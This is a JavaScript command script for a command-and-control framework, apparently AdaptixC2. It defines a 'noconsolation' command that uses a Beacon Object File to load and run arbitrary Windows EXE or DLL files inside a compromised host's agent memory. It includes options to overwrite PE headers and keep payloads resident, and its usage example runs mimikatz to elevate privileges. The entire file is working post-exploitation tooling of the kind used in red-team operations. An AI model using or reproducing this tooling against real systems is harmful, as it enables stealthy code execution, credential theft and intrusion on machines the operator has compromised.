var cmd_no_consolation = ax.create_command("noconsolation", "Run an unmanaged EXE/DLL inside agents's memory", "noconsolation --binary /tmp/mimikatz.exe --args \"privilege::debug token::elevate exit\"");
cmd_no_consolation.addArgFlagString("--local",  "LOCAL_PATH",               false,   "The binary should be loaded from the disk on the target Windows machine");
cmd_no_consolation.addArgFlagString("--memory", "MEMORY_PATH",              false,   "The binary should be loaded from the memory on the target Windows machine");
cmd_no_consolation.addArgFlagFile(  "-f",       "BINARY",                   false,   "Full path to the windows EXE/DLL you wish you run inside agent. If already loaded, you can simply specify the binary name.");
cmd_no_consolation.addArgFlagString("-a",       "ARGS",                     false,   "Parameters for the PE. Must be provided after the path");
cmd_no_consolation.addArgBool(       "--inthread",                                   "Run the PE with the main thread. This might hang your agent depending on the PE and its arguments");
cmd_no_consolation.addArgBool(       "--link-to-peb",                                "Load the PE into the PEB");
cmd_no_consolation.addArgBool(       "--dont-unload",                                "If set, the DLL won't be unloaded");
cmd_no_consolation.addArgFlagInt(    "--timeout", "NUM_SECONDS",            false,   "The number of seconds you wish to wait for the PE to complete running. Default 60 seconds. Set to 0 to disable");
cmd_no_consolation.addArgBool(       "-k",                                           "Overwrite the PE headers");
cmd_no_consolation.addArgFlagString( "--method", "EXPORT_NAME",             false,   "Method or function name to execute in case of DLL. If not provided, DllMain will be executed");
cmd_no_consolation.addArgBool(       "-w",                                           "Command line is passed to unmanaged DLL function in UNICODE format. (default is ANSI)");
cmd_no_consolation.addArgBool(       "-no",                                          "Do not try to obtain the output");
cmd_no_consolation.addArgBool(       "-ac",                                          "Allocate a console. This will spawn a new process");
cmd_no_consolation.addArgBool(       "-ch",                                          "Close Pipe handles once finished. If PowerShell was already ran, this will break the output for PowerShell in the future");
cmd_no_consolation.addArgFlagString( "--free-libraries", "FL_DLLS",         false,   "List of DLLs (DLL_A,DLL_B) (previously loaded with --dont-unload) to be offloaded");
cmd_no_consolation.addArgBool(       "--dont-save",                                  "Do not save this binary in memory");
cmd_no_consolation.addArgBool(       "--list-pes",                                   "List all PEs that have been loaded in memory");
cmd_no_consolation.addArgFlagString( "--unload-pe", "PE_NAME",              false,   "Unload from memory a PE");
cmd_no_consolation.addArgBool(       "-lad",                                         "Custom load all the PE's dependencies");
cmd_no_consolation.addArgFlagString( "-ladb", "LADB_DLLS",                  false,   "Custom load all the PE's dependencies except these (DLL_A,DLL_B)");
cmd_no_consolation.addArgFlagString( "-ld", "LD_DLLS",                      false,   "Custom load these PE's dependencies (DLL_A,DLL_B)");
cmd_no_consolation.addArgFlagString( "-sp", "PATHS",                       false,   "Look for DLLs on these paths (PATH_A,PATH_B) (system32 is the default)");

cmd_no_consolation.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines)
{
    let is_local = 0;
    let local = "";
    let is_memory = 0;
    let memory = "";
    let is_binary = 0;
    let binary = "";
    let is_args = 0;
    let args = "";
    let path = "";
    let pename = "";
    let pepath = "";
    let path_set = 0;
    let name_set = 0;
    let pebytes = "";
    let headers = 0;
    let method = "";
    let use_unicode = 0;
    let timeout = 60;
    let timeout_set = 0;
    let nooutput = 0;
    let alloc_console = 0;
    let close_handles = 0;
    let free_libs = "";
    let dont_save = 0;
    let list_pes = 0;
    let is_unload_pe = 0;
    let unload_pe = "";
    let link_to_peb = 0;
    let dont_unload = 0;
    let load_all_deps = 0;
    let load_all_deps_but = "";
    let load_deps = "";
    let search_paths = "";
    let inthread = 0;
    let pecmdline = "";

    if( ax.is64(id) == false ) { throw new Error("WoW64 is not supported"); }

    if(parsed_json["-k"]) { headers = 1; }
    if(parsed_json["-w"]) { use_unicode = 1; }
    if(parsed_json["-no"]) { nooutput = 1; }
    if(parsed_json["-ac"]) { alloc_console = 1; }
    if(parsed_json["-ch"]) { close_handles = 1; }
    if(parsed_json["--dont-save"]) { dont_save = 1; }
    if(parsed_json["--list-pes"]) { list_pes = 1; }
    if(parsed_json["--link-to-peb"]) { link_to_peb = 1; }
    if(parsed_json["--dont-unload"]) { dont_unload = 1; }
    if(parsed_json["-lad"]) { load_all_deps = 1; }

    if("EXPORT_NAME" in parsed_json) { method = parsed_json["EXPORT_NAME"]; }
    if("FL_DLLS" in parsed_json) { free_libs = parsed_json["FL_DLLS"]; }
    if("LADB_DLLS" in parsed_json) { load_all_deps_but = parsed_json["LADB_DLLS"]; }
    if("LD_DLLS" in parsed_json) { load_deps = parsed_json["LD_DLLS"]; }
    if("PATHS" in parsed_json) { search_paths = parsed_json["PATHS"]; }

    if("PE_NAME" in parsed_json) {
        is_unload_pe = 1;
        unload_pe = parsed_json["PE_NAME"];
    }

    if("LOCAL_PATH" in parsed_json)  {
        is_local = 1;
        local = parsed_json["LOCAL_PATH"];
    }

    if("MEMORY_PATH" in parsed_json)  {
        is_memory = 1;
        memory = parsed_json["MEMORY_PATH"];
    }

    if("BINARY" in parsed_json)  {
        is_binary = 1;
        binary = parsed_json["BINARY"];
    }

    if("ARGS" in parsed_json)  {
        is_args = 1;
        args = parsed_json["ARGS"];
    }

    if("NUM_SECONDS" in parsed_json) {
        timeout = parsed_json["NUM_SECONDS"];
        timeout_set = 1;
    }

    if( is_local + is_binary + is_memory > 1 ) { throw new Error("You must specify either --local, --memory or -f"); }

    if(is_binary) {
        path_set = 1;
    }
    else if(is_local && /^[A-Za-z]:\\.*/.test(local)) {
        path = local;
        path_set = 1;
    }
    else if(is_memory && /^[A-Za-z].*\.exe/.test(memory)) {
        name_set = 1;
        pename = memory;
    }
    else if(list_pes == 0 && is_unload_pe == 0) {
        throw new Error("Specified executable does not exist");
    }

    if( free_libs.length == 0 && unload_pe.length == 0 && list_pes == 0 && name_set == 0 && path_set == 0 && close_handles == 0 ) { throw new Error("PE path not provided"); }
    if( (path_set || unload_pe || free_libs) && list_pes ) { throw new Error("The option --list-pes must be ran alone"); }
    if( free_libs && unload_pe )                           { throw new Error("The option --unload-pe must be ran alone"); }
    if( path_set && (unload_pe || free_libs) )             { throw new Error("The option --unload-pe or --free-libraries must be ran alone") };
    if( timeout_set && inthread )                          { throw new Error("The options --inthread and --timeout are not compatible"); }

    if(path_set) {
        if(is_binary) {
            pename = ax.hash("md5", 8, binary) + ".exe";
            pepath = "C:\\Windows\\System32\\" + pename;
            pebytes = binary
            path = "";
        }
        else {
            pename = ax.file_basename(path);
            pepath = path;
        }
    }

    if (path_set || name_set) {
        pecmdline = pename;
        if(is_args) {
            pecmdline += " " + args;
        }
    }

    var timestamp = ax.format_time("dd/MM hh:mm", ax.ticks());

    let bof_path = ax.script_dir() + "_bin/NoConsolation." + ax.arch(id) + ".o";
    let bof_params = ax.bof_pack("wstr,cstr,wstr,bytes,cstr,int,int,int,wstr,cstr,wstr,int,int,int,int,cstr,int,int,cstr,cstr,int,int,int,cstr,cstr,cstr,int", [pename, pename, pepath, pebytes, path, is_local, timeout, headers, pecmdline, pecmdline, method, use_unicode, nooutput, alloc_console, close_handles, free_libs, dont_save, list_pes, unload_pe, timestamp, link_to_peb, dont_unload, load_all_deps, load_all_deps_but, load_deps, search_paths, inthread ]);
    let message = `Task: execute ${pename} via No-Consolation BOF`;
    ax.execute_alias(id, cmdline, `execute bof "${bof_path}" ${bof_params}`, message);
});